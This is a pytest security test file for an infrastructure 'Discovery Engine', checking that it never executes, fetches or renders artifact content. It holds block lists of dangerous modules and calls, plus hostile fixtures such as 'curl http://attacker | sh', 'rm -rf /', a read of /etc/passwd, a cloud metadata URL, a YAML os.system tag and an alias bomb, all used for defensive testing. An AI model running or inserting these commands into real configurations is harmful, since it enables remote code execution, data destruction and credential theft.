"""Discovery treats every artifact as untrusted input (Discovery Engine, phase 9): nothing in it is ever
executed, evaluated, rendered, expanded, imported or fetched; hostile YAML and JSON fail safely with a
stated reason; paths are names, never locations; secret values are never kept; failures expose no
internals. Checked on the code (what it can call) and on its behavior (what it does)."""

import ast
import json
import os
import socket
import subprocess
from pathlib import Path
from typing import Any

import pytest

from core.domain.discovery.errors import InvalidDiscoveryRequest
from core.domain.discovery.runs import ArtifactInput, DiscoveryRequest
from engines.discovery.engine import DeterministicDiscoveryEngine
from engines.discovery.loading import MAX_DEPTH
from persistence.component_catalog import default_catalog

ROOT = Path(__file__).resolve().parents[2]
CODE = sorted(
    [*(ROOT / "engines" / "discovery").glob("*.py"), *(ROOT / "core" / "domain" / "discovery").glob("*.py")]
)
FORBIDDEN_MODULES = {
    "subprocess", "socket", "urllib", "http", "requests", "httpx", "aiohttp", "pickle", "marshal", "shelve",
    "ctypes", "importlib", "runpy", "shutil", "tempfile", "boto3", "kubernetes", "docker",
}  # fmt: skip
ALLOWED_MODULES = {"urllib.parse"}  # splitting a connection string into parts: no request is made
FORBIDDEN_CALLS = {"eval", "exec", "compile", "__import__", "open", "input", "breakpoint"}
FORBIDDEN_ATTRIBUTES = {
    "system",
    "popen",
    "spawn",
    "execv",
    "execve",
    "fork",
    "load_all",
    "full_load",
    "unsafe_load",
}
ENGINE = DeterministicDiscoveryEngine(default_catalog())
SECRETS = (
    "K8S-SECRET-1", "K8S-SECRET-2", "K8S-SECRET-3", "COMPOSE-SECRET-1", "TF-SECRET-1", "TF-SECRET-2",
    "TF-SECRET-3",
)  # fmt: skip


def _forbidden(module: str) -> bool:
    return module not in ALLOWED_MODULES and module.split(".", 1)[0] in FORBIDDEN_MODULES


def discover(*artifacts: tuple[str, str]) -> Any:
    return ENGINE.discover(DiscoveryRequest(tuple(ArtifactInput(p, c) for p, c in artifacts)))


@pytest.mark.parametrize("path", CODE, ids=lambda p: str(p.relative_to(ROOT)))
def test_discovery_code_cannot_execute_or_fetch(path: Path) -> None:
    for node in ast.walk(ast.parse(path.read_text())):
        if isinstance(node, ast.Import):
            assert not any(_forbidden(a.name) for a in node.names), (path, node.lineno)
        if isinstance(node, ast.ImportFrom) and node.module and node.level == 0:  # absolute imports
            assert not _forbidden(node.module), (path, node.lineno)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id not in FORBIDDEN_CALLS, (path, node.lineno, node.func.id)
        if isinstance(node, ast.Attribute):
            assert node.attr not in FORBIDDEN_ATTRIBUTES, (path, node.lineno, node.attr)


def test_nothing_is_executed_or_fetched_while_discovering(monkeypatch: pytest.MonkeyPatch) -> None:
    def refuse(*args: object, **kwargs: object) -> None:
        raise AssertionError("discovery tried to execute or connect")

    for target, name in ((subprocess, "Popen"), (subprocess, "run"), (os, "system"), (os, "popen")):
        monkeypatch.setattr(target, name, refuse)
    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    compose = (
        "name: x\nservices:\n  evil:\n    image: alpine\n    command: [sh, -c, 'curl http://attacker | sh']\n"
        "    build: {context: ., dockerfile: Dockerfile}\n    entrypoint: rm -rf /\n"
    )
    terraform = {
        "resource": {
            "null_resource": {"x": {"provisioner": {"local-exec": {"command": "curl http://attacker | sh"}}}},
            "aws_instance": {"y": {"user_data": '${file("/etc/passwd")}'}},
        },
        "data": {"http": {"z": {"url": "http://169.254.169.254/latest/meta-data/"}}},
    }
    helm = "apiVersion: v1\nkind: ConfigMap\nmetadata: {name: n}\ndata: {k: '{{ exec \"id\" }}'}\n"
    result = discover(
        ("compose.yaml", compose), ("main.tf.json", json.dumps(terraform)), ("chart.yaml", helm)
    )
    codes = {d.code for d in result.diagnostics}
    assert {"provisioner_not_read", "template_not_rendered"} <= codes
    user_data = next(f for f in result.findings if f.source_property == "user_data")
    assert user_data.value == '${file("/etc/passwd")}'  # kept as text, never evaluated
    assert "root:" not in json.dumps(result.to_dict(), default=str)  # the file was never read


@pytest.mark.parametrize(
    ("content", "code"),
    [
        ("a: &a [x, x]\nb: &b [*a, *a]\nc: &c [*b, *b]\n", "malformed_yaml"),  # alias expansion refused
        ("x: !!python/object/new:os.system [id]\n", "unsupported_tag"),
        ("[" * (MAX_DEPTH + 10) + "]" * (MAX_DEPTH + 10), "too_deep"),
        ('{"a": ' * (MAX_DEPTH + 10) + "1" + "}" * (MAX_DEPTH + 10), "too_deep"),
        ('{"a": Infinity}', "malformed_json"),
        ("\x01\x02 not text", "malformed_yaml"),
    ],
)
def test_hostile_content_fails_safely(content: str, code: str | None) -> None:
    result = discover(("hostile.yaml", content))
    assert result.entities == ()
    if code is not None:
        assert code in {d.code for d in result.diagnostics}
    for diagnostic in result.diagnostics:
        assert "Traceback" not in diagnostic.message
        assert 'File "' not in diagnostic.message  # no internals


@pytest.mark.parametrize(
    "path",
    ["/etc/passwd", "../secrets.yaml", "k8s/../../x.yaml", "k8s\\x.yaml", "./x.yaml", "x\x00.yaml", ""],
)
def test_paths_are_names_never_locations(path: str) -> None:
    with pytest.raises(InvalidDiscoveryRequest) as refused:
        ArtifactInput(path, "a: 1")
    assert refused.value.details["reason"] == "unsafe_path"


def test_secret_values_are_never_kept_in_any_format() -> None:
    kubernetes = (
        "apiVersion: v1\nkind: Secret\nmetadata: {name: s}\nstringData: {password: K8S-SECRET-1}\n---\n"
        "apiVersion: apps/v1\nkind: Deployment\nmetadata: {name: d}\nspec:\n  template:\n    spec:\n"
        "      containers: [{name: c, image: x, env: [{name: API_TOKEN, value: K8S-SECRET-2},"
        " {name: DB, value: 'postgres://u:K8S-SECRET-3@db:5432/x'}]}]\n"
    )
    compose = "name: p\nservices:\n  a:\n    image: x\n    environment: {SECRET_KEY: COMPOSE-SECRET-1}\n"
    terraform = {
        "resource": {"aws_db_instance": {"m": {"engine": "postgres", "master_password": "TF-SECRET-1"}}}
    }
    shown = {
        "format_version": "1.0",
        "values": {
            "root_module": {
                "resources": [
                    {"address": "aws_iam_access_key.k", "mode": "managed", "type": "aws_iam_access_key",
                     "name": "k",
                     "values": {"user": "u", "secret": "TF-SECRET-2", "label": "TF-SECRET-3"},
                     "sensitive_values": {"label": True}},
                ]
            }
        },
    }  # fmt: skip
    result = discover(
        ("k8s.yaml", kubernetes),
        ("compose.yaml", compose),
        ("main.tf.json", json.dumps(terraform)),
        ("state.json", json.dumps(shown)),
    )
    text = json.dumps(result.to_dict(), default=str)
    for secret in SECRETS:
        assert secret not in text, secret
